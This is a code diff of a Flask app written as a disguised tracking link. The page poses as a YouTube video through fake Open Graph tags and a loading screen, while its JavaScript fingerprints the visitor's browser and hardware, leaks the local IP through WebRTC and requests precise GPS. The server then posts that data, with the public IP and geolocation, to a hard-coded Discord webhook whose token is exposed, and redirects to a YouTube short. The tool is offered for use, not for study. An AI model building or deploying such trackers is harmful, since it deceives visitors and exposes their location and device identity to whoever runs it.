@@ -1,4 +1,4 @@
-from flask import Flask, request, redirect
+from flask import Flask, request, redirect, jsonify
 from datetime import datetime
 import requests
 import os
@@ -11,17 +11,14 @@ app = Flask(__name__)
 # ==================== CONFIGURAZIONE ====================
 WEBHOOK_URL = "https://discord.com/api/webhooks/1528013241819594853/ajTR7-zJ32yBsxulXb4688xXeWaqVgr9pQk6dW3ffPpFaeWgbWydLkRQyH6M56515lNA"
 IMAGE_URL = "https://media.discordapp.net/attachments/1527831756005183559/1528024870393483475/Nuovo_progetto_-_2026-07-18T150514.387.png?ex=6a5ccb8e&is=6a5b7a0e&hm=709fc7a05f8b331d71610beac5dd3757722bb147a2b4a6f7f36d8b2060094563&=&format=webp&quality=lossless&width=17&height=17"
+REDIRECT_URL = "https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share"
 
 visit_counter = 0
-pending_fingerprints = {}  # Per aggiornare il report con fingerprint e dati JS
 
 # ==================== FUNZIONI ====================
 
 def get_client_ip(request):
-    """
-    Estrae SOLO l'IP pubblico del client, ignorando proxy interni.
-    Prende il primo IP da X-Forwarded-For (quello del client reale).
-    """
+    """Estrae SOLO l'IP pubblico del client, ignorando proxy interni."""
     forwarded = request.headers.get('X-Forwarded-For', '')
     if forwarded:
         return forwarded.split(',')[0].strip()
@@ -82,7 +79,7 @@ def get_device_info(request):
     # Rilevamento OS
     if 'Windows NT 10' in ua:
         info["os"] = "Windows 10/11"
-        info["os_version"] = "NT 10.0"  # Mostra la versione del kernel
+        info["os_version"] = "NT 10.0"
     elif 'Windows NT 6.3' in ua:
         info["os"] = "Windows 8.1"
         info["os_version"] = "NT 6.3"
@@ -135,10 +132,7 @@ def get_device_info(request):
     return info
 
 def build_report(ip, ip_info, device_info, request_info, route_name, fingerprint=None, local_ip=None, gps=None):
-    """
-    Costruisce la descrizione testuale del report per Discord,
-    includendo TUTTE le informazioni raccolte.
-    """
+    """Costruisce la descrizione testuale del report per Discord."""
     global visit_counter
     visit_counter += 1
     date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")
@@ -260,7 +254,183 @@ def send_to_discord(description, ip, ip_info, device_info, date, counter):
 
 @app.route("/")
 def index():
-    """Rotta principale: tracciamento immediato + fingerprinting + WebRTC + GPS."""
+    """Restituisce la pagina HTML che esegue fingerprinting e invia i dati a /report."""
+    return """
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="UTF-8">
+        <meta property="og:title" content="YouTube">
+        <meta property="og:image" content="https://i.ytimg.com/vi/8W7RA8Akfxo/maxresdefault.jpg">
+    </head>
+    <body style="background:#000;margin:0;display:flex;justify-content:center;align-items:center;height:100vh;">
+        <p style="color:#fff;font-family:Arial;font-size:18px;">Caricamento...</p>
+        <script>
+            var fp = {};
+
+            // Fingerprinting di base
+            fp.screen = screen.width + 'x' + screen.height;
+            fp.colorDepth = screen.colorDepth + ' bit';
+            fp.viewport = window.innerWidth + 'x' + window.innerHeight;
+            fp.pixelRatio = window.devicePixelRatio || '?';
+            fp.platform = navigator.platform || '?';
+            fp.cpuCores = navigator.hardwareConcurrency || '?';
+            fp.ram = navigator.deviceMemory || '?';
+            if (navigator.connection) {
+                fp.connection = navigator.connection.effectiveType || '?';
+                if (navigator.connection.downlink) fp.connection += ' (' + navigator.connection.downlink + ' Mbps)';
+            } else fp.connection = '?';
+            fp.touch = ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? 'Si' : 'No';
+            fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            fp.language = navigator.language;
+            fp.cookiesEnabled = navigator.cookieEnabled ? 'Si' : 'No';
+            fp.doNotTrack = navigator.doNotTrack || 'Non impostato';
+
+            // Batteria
+            if (navigator.getBattery) {
+                navigator.getBattery().then(function(b) {
+                    fp.battery = Math.round(b.level * 100) + '%';
+                    if (b.charging) fp.battery += ' (in carica)';
+                });
+            }
+
+            // GPU via WebGL
+            try {
+                var c = document.createElement('canvas');
+                var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+                if (gl) {
+                    var dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (dbg) {
+                        fp.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+                        fp.gpuVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
+                    }
+                }
+            } catch(e) {}
+
+            // Canvas fingerprint
+            try {
+                var c2 = document.createElement('canvas');
+                c2.width = 200; c2.height = 50;
+                var ctx = c2.getContext('2d');
+                ctx.textBaseline = 'top'; ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60'; ctx.fillRect(125,1,62,20);
+                ctx.fillStyle = '#069'; ctx.fillText('Test 123!', 2, 15);
+                fp.canvas = c2.toDataURL().substring(0, 80);
+            } catch(e) {}
+
+            // WebGL fingerprint
+            try {
+                var c3 = document.createElement('canvas');
+                var gl2 = c3.getContext('webgl') || c3.getContext('experimental-webgl');
+                if (gl2) {
+                    var ext = gl2.getExtension('WEBGL_debug_renderer_info');
+                    var params = [];
+                    if (ext) {
+                        params.push(gl2.getParameter(ext.UNMASKED_RENDERER_WEBGL));
+                        params.push(gl2.getParameter(ext.UNMASKED_VENDOR_WEBGL));
+                    }
+                    fp.webgl = params.join('|').substring(0, 80);
+                }
+            } catch(e) {}
+
+            // Font detection base
+            try {
+                var fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Trebuchet MS', 'Impact'];
+                var testStr = 'mmmmmmmmmmlli';
+                var testSize = '72px';
+                var available = [];
+                var testEl = document.createElement('span');
+                testEl.style.fontSize = testSize;
+                testEl.style.visibility = 'hidden';
+                testEl.innerHTML = testStr;
+                document.body.appendChild(testEl);
+                var monoWidth = testEl.offsetWidth;
+                for (var i = 0; i < fonts.length; i++) {
+                    testEl.style.fontFamily = fonts[i] + ', monospace';
+                    if (testEl.offsetWidth !== monoWidth) available.push(fonts[i]);
+                }
+                document.body.removeChild(testEl);
+                fp.fonts = available.length + '/' + fonts.length + ' rilevati';
+            } catch(e) {}
+
+            // Plugin browser
+            try {
+                if (navigator.plugins && navigator.plugins.length > 0) {
+                    var plist = [];
+                    for (var i = 0; i < Math.min(navigator.plugins.length, 5); i++) {
+                        if (navigator.plugins[i].name) plist.push(navigator.plugins[i].name);
+                    }
+                    fp.plugins = plist.length > 0 ? plist.join(', ') : 'Nessuno';
+                } else fp.plugins = 'Nessuno';
+            } catch(e) { fp.plugins = '?'; }
+
+            // WebRTC per IP locale (solo se privato)
+            function getLocalIP() {
+                return new Promise((resolve) => {
+                    var pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+                    pc.createDataChannel("");
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                    pc.onicecandidate = (e) => {
+                        if (!e.candidate) return;
+                        var candidate = e.candidate.candidate;
+                        var ipRegex = /([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)/;
+                        var match = candidate.match(ipRegex);
+                        if (match) {
+                            var ip = match[1];
+                            // Restituisci solo se è un IP privato
+                            if (ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
+                                pc.close();
+                                resolve(ip);
+                            }
+                        }
+                    };
+                    setTimeout(() => { pc.close(); resolve(null); }, 2000);
+                });
+            }
+
+            // GPS
+            function getGPS() {
+                return new Promise((resolve) => {
+                    if (!navigator.geolocation) { resolve(null); return; }
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }),
+                        (err) => resolve(null),
+                        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                    );
+                });
+            }
+
+            // Invia tutto al server
+            async function sendData() {
+                var localIP = await getLocalIP();
+                var gps = await getGPS();
+                var payload = { fingerprint: fp, localIP: localIP, gps: gps };
+                try {
+                    var response = await fetch('/report', {
+                        method: 'POST',
+                        body: JSON.stringify(payload),
+                        headers: {'Content-Type': 'application/json'}
+                    });
+                    var data = await response.json();
+                    window.location.href = data.redirect;
+                } catch(e) {
+                    // Fallback: invia senza payload e reindirizza comunque
+                    fetch('/report', {
+                        method: 'POST',
+                        body: '{}',
+                        headers: {'Content-Type': 'application/json'}
+                    }).then(r => r.json()).then(d => { window.location.href = d.redirect; });
+                }
+            }
+            sendData();
+        </script>
+    </body>
+    </html>
+    """
+
+@app.route("/report", methods=["POST"])
+def report():
+    """Riceve i dati fingerprint, IP locale, GPS e invia il report completo a Discord."""
     ip = get_client_ip(request)
     ip_info = get_ip_info(ip)
     device_info = get_device_info(request)
@@ -272,183 +442,26 @@ def index():
         "cookies": len(request.cookies)
     }
 
-    # Prima invio del report base (senza fingerprint)
-    description, date, counter = build_report(ip, ip_info, device_info, request_info, "Home")
+    # Legge il JSON inviato dal client
+    try:
+        data = request.get_json()
+    except:
+        data = {}
+    if not data:
+        data = {}
+
+    fingerprint = data.get('fingerprint', {})
+    local_ip = data.get('localIP')
+    gps = data.get('gps')
+
+    # Costruisce e invia il report
+    description, date, counter = build_report(
+        ip, ip_info, device_info, request_info, "Home",
+        fingerprint=fingerprint, local_ip=local_ip, gps=gps
+    )
     send_to_discord(description, ip, ip_info, device_info, date, counter)
 
-    # Salvo i dati in attesa del fingerprint
-    visit_id = str(int(time.time() * 1000))
-    pending_fingerprints[visit_id] = {
-        "ip": ip,
-        "ip_info": ip_info,
-        "device_info": device_info,
-        "request_info": request_info,
-        "date": date,
-        "counter": counter
-    }
-
-    # Pagina HTML con JavaScript per raccogliere fingerprint, IP locale e GPS
-    return f"""
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <meta charset="UTF-8">
-        <meta property="og:title" content="YouTube">
-        <meta property="og:image" content="https://i.ytimg.com/vi/8W7RA8Akfxo/maxresdefault.jpg">
-    </head>
-    <body style="background:#000;margin:0;display:flex;justify-content:center;align-items:center;height:100vh;">
-        <p style="color:#fff;font-family:Arial;font-size:18px;">Caricamento...</p>
-        <script>
-            var fp = {{}}, visitId = '{visit_id}';
-
-            // Fingerprinting di base
-            fp.screen = screen.width + 'x' + screen.height;
-            fp.colorDepth = screen.colorDepth + ' bit';
-            fp.viewport = window.innerWidth + 'x' + window.innerHeight;
-            fp.pixelRatio = window.devicePixelRatio || '?';
-            fp.platform = navigator.platform || '?';
-            fp.cpuCores = navigator.hardwareConcurrency || '?';
-            fp.ram = navigator.deviceMemory || '?';
-            if (navigator.connection) {{
-                fp.connection = navigator.connection.effectiveType || '?';
-                if (navigator.connection.downlink) fp.connection += ' (' + navigator.connection.downlink + ' Mbps)';
-            }} else fp.connection = '?';
-            fp.touch = ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? 'Si' : 'No';
-            fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            fp.language = navigator.language;
-            fp.cookiesEnabled = navigator.cookieEnabled ? 'Si' : 'No';
-            fp.doNotTrack = navigator.doNotTrack || 'Non impostato';
-
-            // Batteria
-            if (navigator.getBattery) {{
-                navigator.getBattery().then(function(b) {{
-                    fp.battery = Math.round(b.level * 100) + '%';
-                    if (b.charging) fp.battery += ' (in carica)';
-                }});
-            }}
-
-            // GPU via WebGL
-            try {{
-                var c = document.createElement('canvas');
-                var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-                if (gl) {{
-                    var dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (dbg) {{
-                        fp.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
-                        fp.gpuVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
-                    }}
-                }}
-            }} catch(e) {{}}
-
-            // Canvas fingerprint
-            try {{
-                var c2 = document.createElement('canvas');
-                c2.width = 200; c2.height = 50;
-                var ctx = c2.getContext('2d');
-                ctx.textBaseline = 'top'; ctx.font = '14px Arial';
-                ctx.fillStyle = '#f60'; ctx.fillRect(125,1,62,20);
-                ctx.fillStyle = '#069'; ctx.fillText('Test 123!', 2, 15);
-                fp.canvas = c2.toDataURL().substring(0, 80);
-            }} catch(e) {{}}
-
-            // WebGL fingerprint
-            try {{
-                var c3 = document.createElement('canvas');
-                var gl2 = c3.getContext('webgl') || c3.getContext('experimental-webgl');
-                if (gl2) {{
-                    var ext = gl2.getExtension('WEBGL_debug_renderer_info');
-                    var params = [];
-                    if (ext) {{
-                        params.push(gl2.getParameter(ext.UNMASKED_RENDERER_WEBGL));
-                        params.push(gl2.getParameter(ext.UNMASKED_VENDOR_WEBGL));
-                    }}
-                    fp.webgl = params.join('|').substring(0, 80);
-                }}
-            }} catch(e) {{}}
-
-            // Font detection base
-            try {{
-                var fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Trebuchet MS', 'Impact'];
-                var testStr = 'mmmmmmmmmmlli';
-                var testSize = '72px';
-                var available = [];
-                var testEl = document.createElement('span');
-                testEl.style.fontSize = testSize;
-                testEl.style.visibility = 'hidden';
-                testEl.innerHTML = testStr;
-                document.body.appendChild(testEl);
-                var monoWidth = testEl.offsetWidth;
-                for (var i = 0; i < fonts.length; i++) {{
-                    testEl.style.fontFamily = fonts[i] + ', monospace';
-                    if (testEl.offsetWidth !== monoWidth) available.push(fonts[i]);
-                }}
-                document.body.removeChild(testEl);
-                fp.fonts = available.length + '/' + fonts.length + ' rilevati';
-            }} catch(e) {{}}
-
-            // Plugin browser
-            try {{
-                if (navigator.plugins && navigator.plugins.length > 0) {{
-                    var plist = [];
-                    for (var i = 0; i < Math.min(navigator.plugins.length, 5); i++) {{
-                        if (navigator.plugins[i].name) plist.push(navigator.plugins[i].name);
-                    }}
-                    fp.plugins = plist.length > 0 ? plist.join(', ') : 'Nessuno';
-                }} else fp.plugins = 'Nessuno';
-            }} catch(e) {{ fp.plugins = '?'; }}
-
-            // WebRTC per IP locale
-            function getLocalIP() {{
-                return new Promise((resolve) => {{
-                    var pc = new RTCPeerConnection({{ iceServers: [{{ urls: "stun:stun.l.google.com:19302" }}] }});
-                    pc.createDataChannel("");
-                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
-                    pc.onicecandidate = (e) => {{
-                        if (!e.candidate) return;
-                        var candidate = e.candidate.candidate;
-                        var ipRegex = /([0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+)/;
-                        var match = candidate.match(ipRegex);
-                        if (match) {{
-                            pc.close();
-                            resolve(match[1]);
-                        }}
-                    }};
-                    setTimeout(() => {{ pc.close(); resolve(null); }}, 2000);
-                }});
-            }}
-
-            // GPS
-            function getGPS() {{
-                return new Promise((resolve) => {{
-                    if (!navigator.geolocation) {{ resolve(null); return; }}
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => resolve({{ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }}),
-                        (err) => resolve(null),
-                        {{ enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }}
-                    );
-                }});
-            }}
-
-            // Invia tutto al server
-            async function sendData() {{
-                var localIP = await getLocalIP();
-                var gps = await getGPS();
-                var payload = {{ fingerprint: fp, localIP: localIP, gps: gps }};
-                fetch('/fp?vid=' + visitId, {{
-                    method: 'POST',
-                    body: JSON.stringify(payload),
-                    headers: {{'Content-Type': 'application/json'}}
-                }}).then(() => {{
-                    window.location.href = "https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share";
-                }}).catch(() => {{
-                    window.location.href = "https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share";
-                }});
-            }}
-            sendData();
-        </script>
-    </body>
-    </html>
-    """
+    return jsonify({"redirect": REDIRECT_URL})
 
 @app.route("/img")
 @app.route("/image")
@@ -519,44 +532,7 @@ def video_preview():
     }
     description, date, counter = build_report(ip, ip_info, device_info, request_info, "Video")
     send_to_discord(description, ip, ip_info, device_info, date, counter)
-    return redirect("https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share")
-
-@app.route("/fp", methods=["POST"])
-def receive_fingerprint():
-    """
-    Riceve i dati fingerprint, IP locale e GPS dal JavaScript,
-    quindi invia un secondo report Discord aggiornato.
-    """
-    global pending_fingerprints, visit_counter
-    try:
-        data = request.get_json()
-        if not data:
-            return "ok", 200
-
-        visit_id = request.args.get('vid', '')
-        fp = data.get('fingerprint', {})
-        local_ip = data.get('localIP')
-        gps = data.get('gps')
-
-        if visit_id in pending_fingerprints:
-            info = pending_fingerprints[visit_id]
-            visit_counter -= 1  # build_report incrementerà di nuovo
-            description, date, counter = build_report(
-                info["ip"],
-                info["ip_info"],
-                info["device_info"],
-                info["request_info"],
-                "Home",
-                fingerprint=fp,
-                local_ip=local_ip,
-                gps=gps
-            )
-            send_to_discord(description, info["ip"], info["ip_info"], info["device_info"], date, counter)
-            del pending_fingerprints[visit_id]
-            print(f"✅ Report aggiornato con fingerprint, IP locale e GPS")
-    except Exception as e:
-        print(f"❌ Errore nella ricezione fingerprint: {e}")
-    return "ok", 200
+    return redirect(REDIRECT_URL)
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
